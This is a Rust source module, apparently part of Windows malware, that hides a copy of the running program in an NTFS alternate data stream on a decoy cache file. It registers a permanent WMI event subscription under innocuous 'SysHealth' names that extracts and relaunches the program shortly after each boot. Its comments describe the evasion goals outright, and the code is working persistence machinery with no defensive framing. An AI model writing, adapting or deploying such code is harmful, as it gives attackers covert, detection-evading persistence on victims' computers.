#[cfg(windows)]
use std::path::PathBuf;
#[cfg(windows)]
use std::process::Command;
#[cfg(windows)]
use std::fs;

#[cfg(windows)]
pub fn apply_shadow_persistence() -> Result<(), Box<dyn std::error::Error>> {
    backup_to_ads()?;
    register_wmi_persistence()?;
    Ok(())
}

#[cfg(not(windows))]
pub fn apply_shadow_persistence() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(windows)]
fn backup_to_ads() -> Result<(), Box<dyn std::error::Error>> {
    // 1. Target Host File: C:\ProgramData\Microsoft\Windows\Caches\index.dat
    // This file looks legit.
    let program_data = std::env::var("ProgramData").unwrap_or("C:\\ProgramData".to_string());
    let cache_dir = PathBuf::from(&program_data).join("Microsoft").join("Windows").join("Caches");
    
    if !cache_dir.exists() {
        fs::create_dir_all(&cache_dir)?;
    }
    
    let host_file = cache_dir.join("index.dat");
    // Ensure host file exists (can be empty)
    if !host_file.exists() {
        fs::File::create(&host_file)?;
    }

    let current_exe = std::env::current_exe()?;
    
    // Command: cmd /c type CURRENT_EXE > HOST_FILE:sys_backup
    // Note: Rust std::fs doesn't support ADS directly easily, using shell redirect is reliable.
    let ads_path = format!("{}:sys_backup", host_file.display());
    
    let _ = Command::new("cmd")
        .args(&[
            "/c", 
            "type", 
            &format!("\"{}\"", current_exe.display()), 
            ">", 
            &format!("\"{}\"", ads_path)
        ])
        .output();
        
    Ok(())
}

#[cfg(windows)]
fn register_wmi_persistence() -> Result<(), Box<dyn std::error::Error>> {
    // PHANTOM TRIGGER (WMI)
    // We create a permanent WMI Event Subscription.
    
    // 1. Event Filter: Trigger when SystemUptime is between 200 and 320 seconds.
    // This ensures it runs shortly after boot, but not immediately (avoiding boot detection).
    // Namespace: root\subscription
    
    let filter_name = "SysHealthFilter";
    let consumer_name = "SysHealthConsumer";
    
    // Cleanup old (to avoid duplicates or errors)
    let _ = Command::new("wmic")
        .args(&["/namespace:\\\\root\\subscription", "path", "__EventFilter", "where", &format!("Name='{}'", filter_name), "delete"])
        .output();
    let _ = Command::new("wmic")
        .args(&["/namespace:\\\\root\\subscription", "path", "CommandLineEventConsumer", "where", &format!("Name='{}'", consumer_name), "delete"])
        .output();
    let _ = Command::new("wmic")
        .args(&["/namespace:\\\\root\\subscription", "path", "__FilterToConsumerBinding", "where", &format!("Filter='__EventFilter.Name=\"{}\"'", filter_name), "delete"])
        .output();

    // 2. Create Event Filter
    // Query: Select * from __InstanceModificationEvent within 60 where TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 320
    let query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 320";
    
    let _ = Command::new("wmic")
        .args(&[
            "/namespace:\\\\root\\subscription", "path", "__EventFilter", "create", 
            &format!("Name={}", filter_name), 
            "EventNamespace=root\\cimv2", 
            &format!("QueryLanguage=WQL"), 
            &format!("Query={}", query)
        ])
        .output();
        
    // 3. Create Consumer (The Payload)
    // We need to EXTRACT the binary from ADS and run it.
    // Command: powershell -WindowStyle Hidden -Command "..."
    let program_data = std::env::var("ProgramData").unwrap_or("C:\\ProgramData".to_string());
    // Hardcoding path for WMI command string simplicity
    let host_path = format!("{}\\Microsoft\\Windows\\Caches\\index.dat", program_data); 
    // We extract to a temp location and run
    let temp_exe = format!("{}\\WindowsHealth\\sys_wmi.exe", program_data); // Reuse our folder
    
    // The command the consumer runs:
    // cmd /c type HOST:sys_backup > TEMP && TEMP
    let payload_cmd = format!("cmd /c type \"{}:sys_backup\" > \"{}\" && \"{}\"", host_path, temp_exe, temp_exe);
    
    let _ = Command::new("wmic")
        .args(&[
            "/namespace:\\\\root\\subscription", "path", "CommandLineEventConsumer", "create", 
            &format!("Name={}", consumer_name), 
            &format!("CommandLineTemplate={}", payload_cmd)
        ])
        .output();
        
    // 4. Bind Filter to Consumer
    let _ = Command::new("wmic")
        .args(&[
            "/namespace:\\\\root\\subscription", "path", "__FilterToConsumerBinding", "create", 
            &format!("Filter=__EventFilter.Name=\"{}\"", filter_name), 
            &format!("Consumer=CommandLineEventConsumer.Name=\"{}\"", consumer_name)
        ])
        .output();

    Ok(())
}
